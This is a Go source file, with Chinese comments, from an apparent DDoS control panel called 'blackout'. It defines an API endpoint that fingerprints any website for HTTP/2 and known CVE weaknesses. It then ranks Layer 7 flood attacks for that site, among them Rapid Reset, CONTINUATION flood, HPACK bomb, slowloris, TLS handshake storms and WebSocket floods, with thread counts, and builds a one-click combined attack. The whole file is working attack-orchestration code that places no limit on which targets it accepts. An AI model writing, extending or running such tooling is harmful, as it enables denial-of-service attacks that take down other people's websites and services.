package controller

import (
	"encoding/json"
	"net/http"
	"strings"
	"time"

	"blackout/internal/attack"
)

// ============================================================
// L7 目标侦察与攻击推荐：
//   POST /api/l7/test  {"target":"https://example.com","timeout":5}
//
// 对目标做一次轻量指纹探测（HTTP/2 ALPN、响应头、CVE 版本表），
// 返回检测结果 + 按优先级排序的攻击推荐：
//   - 目标存在 CVE 脆弱点（Rapid Reset / CONTINUATION / HPACK Bomb）
//     → 对应 CVE 攻击排最前
//   - 否则推荐通用流量型（http_flood / post_flood / http2_flood）
// 前端可一键把推荐方法预填进攻击表单发起。
// ============================================================

// L7Recommendation 单个攻击推荐
type L7Recommendation struct {
	Method    string                 `json:"method"`
	ReasonKey string                 `json:"reason_key"` // 前端 i18n 键
	Priority  int                    `json:"priority"`   // 越大越优先
	Params    map[string]interface{} `json:"params"`     // 预填参数（threads 等）
}

// L7ComboSub 一键组合的子攻击项
type L7ComboSub struct {
	Method  string `json:"method"`
	Threads int    `json:"threads"`
}

// L7TestResponse 检测 + 推荐结果
type L7TestResponse struct {
	Fingerprint     *attack.L7Fingerprint `json:"fingerprint"`
	Recommendations []L7Recommendation    `json:"recommendations"`
	// Combo 一键全维度组合：按检测到的能力组装（带宽+CPU+连接+慢速+WS），
	// 前端可直接填入组合攻击表单
	Combo []L7ComboSub `json:"combo"`
}

// buildL7Combo 按目标能力组装全维度组合（带宽/CPU/连接/慢速/WS 各一）
func buildL7Combo(fp *attack.L7Fingerprint) []L7ComboSub {
	h2 := fp != nil && (fp.HTTP2 || fp.HTTP2C)
	var combo []L7ComboSub
	add := func(method string, threads int) {
		combo = append(combo, L7ComboSub{Method: method, Threads: threads})
	}

	// 带宽型
	if fp != nil && fp.StaticRange {
		add("range_flood", 50)
	} else {
		add("http_flood", 50)
	}
	// CPU 型（按能力选）
	if h2 {
		add("http2_reset", 50)
		add("h2_ping", 30)
	}
	if fp != nil && strings.HasPrefix(fp.Target, "https://") {
		add("tls_handshake", 30)
	}
	// 连接/慢速型
	if fp != nil && fp.WS {
		add("ws_slow", 50)
	}
	if fp != nil && fp.SlowApplicable {
		add("slowloris", 50)
	} else {
		add("post_flood", 30)
	}
	return combo
}

// handleL7Test POST /api/l7/test
// 探测目标并返回推荐攻击列表。探测为单次轻量请求，不产生持续压力。
func (c *Ctrl) handleL7Test(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, `{"error":"POST required"}`, 405)
		return
	}
	var req struct {
		Target  string `json:"target"`
		Timeout int    `json:"timeout"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, map[string]string{"error": "invalid json"})
		return
	}
	target := strings.TrimSpace(req.Target)
	if target == "" {
		writeJSON(w, map[string]string{"error": "target is required"})
		return
	}
	// 无 scheme 时补 http://（FingerprintL7Target 需要完整 URL）
	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
		target = "http://" + target
	}
	timeout := time.Duration(req.Timeout) * time.Second
	if timeout <= 0 {
		timeout = 5 * time.Second
	}
	if timeout > 15*time.Second {
		timeout = 15 * time.Second // 探测超时上限，防同步请求挂太久
	}

	fp := attack.FingerprintL7Target(target, timeout)

	// 80 端口探测不到 HTTP/2 时补一次 443 探测：
	// http://example.com 通常只有 h2c 才在 80 上支持（罕见），而 443 的
	// TLS+ALPN 才是绝大多数站点的 h2 入口。无 scheme 输入默认补 http://，
	// 若目标实际跑在 443 上，不补探测会漏掉全部 h2 CVE 推荐。
	if !fp.HTTP2 && !fp.HTTP2C && strings.HasPrefix(target, "http://") {
		httpsTarget := "https://" + strings.TrimPrefix(target, "http://")
		fp443 := attack.FingerprintL7Target(httpsTarget, timeout)
		if fp443.HTTP2 {
			fp.HTTP2 = true
			fp.Notes = append(fp.Notes, "HTTP/2 detected via HTTPS (443) ALPN probe")
		}
	}

	recs := buildL7Recommendations(fp)
	c.auditAction(r, "l7_test", target)
	writeJSON(w, L7TestResponse{Fingerprint: fp, Recommendations: recs, Combo: buildL7Combo(fp)})
}

// buildL7Recommendations 根据指纹结果生成推荐（CVE 优先，按目标能力扩展）。
// 排序保证：推荐的先后即前端展示顺序（已按 Priority 降序 push）。
func buildL7Recommendations(fp *attack.L7Fingerprint) []L7Recommendation {
	var recs []L7Recommendation
	h2 := fp != nil && (fp.HTTP2 || fp.HTTP2C)
	baseParams := func(threads int) map[string]interface{} {
		return map[string]interface{}{"threads": threads, "duration": 60}
	}
	rec := func(method, reasonKey string, priority, threads int) {
		recs = append(recs, L7Recommendation{
			Method: method, ReasonKey: reasonKey, Priority: priority,
			Params: baseParams(threads),
		})
	}

	// —— CVE 攻击（仅目标支持 HTTP/2 时推荐）——
	if h2 {
		// HPACK Bomb：IIS 内核态无修复，恒脆弱；其余未修复版本大概率脆弱。
		// 攻击端有自动门控（StartHTTP2BombEx 内部复检 BombVuln，误判自动
		// 降级 CONTINUATION Flood），推荐无风险。
		if fp.BombVuln {
			rec("http2_bomb", "l7_rec_bomb", 100, 100)
		}
		if fp.Vulnerable {
			rec("http2_reset", "l7_rec_reset", 90, 100)
		}
		if fp.ContinuationVuln {
			rec("http2_continuation", "l7_rec_cont", 80, 100)
		}
		// h2 帧级补充（与流级 CVE 攻击互补，走不同帧路径）
		rec("h2_ping", "l7_rec_h2ping", 70, 50)
	}

	// —— 能力型推荐（按探测到的目标特性；探测失败时跳过，
	// 避免对死目标推荐 tls_handshake/ws 等能力方法）——
	capable := fp != nil && (fp.ServerHeader != "" || fp.HTTP2 || fp.HTTP2C ||
		fp.WS || fp.StaticRange || fp.SlowApplicable || fp.BodySize > 0)
	if capable {
		// TLS 目标：握手风暴（CPU 型，低延迟场景更强）
		if strings.HasPrefix(fp.Target, "https://") {
			rec("tls_handshake", "l7_rec_tls", 65, 50)
		}
		// WebSocket 端点：连接占坑 + 消息洪泛（长连接容量攻击）
		if fp.WS {
			rec("ws_slow", "l7_rec_wsslow", 60, 50)
			rec("ws_flood", "l7_rec_wsflood", 55, 30)
		}
		// 慢速适用：请求头无快速超时 → slowloris/slow POST 连接池占坑
		if fp.SlowApplicable {
			rec("slowloris", "l7_rec_slowloris", 58, 50)
			rec("slow_post", "l7_rec_slowpost", 54, 30)
		}
		// 静态资源/CDN：响应放大型（目标自己吐大流量）
		if fp.StaticRange {
			rec("range_flood", "l7_rec_range", 52, 50)
		}
	}

	// —— 通用流量型（不依赖目标特性的兜底）——
	rec("http_flood", "l7_rec_http", 48, 50)
	rec("post_flood", "l7_rec_post", 46, 50)
	if h2 {
		rec("http2_flood", "l7_rec_h2", 44, 50)
	} else {
		// 目标探测不到 HTTP/2：仍可尝试（https ALPN 未暴露 / 明文 h2c 探测失败），
		// 但标注不确定，避免用户误以为必有效
		rec("http2_flood", "l7_rec_h2_noalpn", 44, 50)
	}
	return recs
}
